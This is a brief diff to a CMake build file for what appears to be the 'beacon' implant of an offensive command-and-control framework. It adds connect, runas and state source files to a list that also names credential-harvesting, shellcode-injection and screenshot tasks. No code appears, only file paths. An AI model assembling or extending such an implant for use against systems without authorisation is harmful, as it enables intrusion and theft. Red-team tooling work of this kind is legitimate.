@@ -45,6 +45,7 @@ if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
             src/main/beacon_${PAYLOAD_FORMAT}.cpp
             src/hermit.cpp
             src/core/handler.cpp
+            src/core/state.cpp
             src/core/stdout.cpp
             src/core/system/arch.cpp
             src/core/system/env.cpp
@@ -58,6 +59,7 @@ if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
             src/core/technique/injection/shellcode_injection.cpp
             src/core/tasks/cat.cpp
             src/core/tasks/cd.cpp
+            src/core/tasks/connect.cpp
             src/core/tasks/cp.cpp
             src/core/tasks/creds.cpp
             src/core/tasks/dll.cpp
@@ -79,6 +81,7 @@ if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
             src/core/tasks/reg.cpp
             src/core/tasks/rm.cpp
             src/core/tasks/rmdir.cpp
+            src/core/tasks/runas.cpp
             src/core/tasks/screenshot.cpp
             src/core/tasks/shellcode.cpp
             src/core/tasks/sleep.cpp
